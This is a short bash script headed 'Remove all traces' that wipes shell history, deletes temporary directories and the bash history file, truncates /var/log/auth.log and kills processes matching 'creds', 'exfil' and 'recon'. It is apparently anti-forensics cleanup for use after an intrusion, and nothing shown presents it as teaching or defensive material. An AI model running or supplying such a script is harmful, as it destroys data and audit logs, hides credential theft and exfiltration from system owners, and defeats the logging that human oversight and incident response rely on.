#!/bin/bash
# Remove all traces
history -c && history -w
rm -rf /tmp/* /var/tmp/* ~/.bash_history
echo > /var/log/auth.log  # Truncate logs
pkill -f "bash.*creds\|exfil\|recon"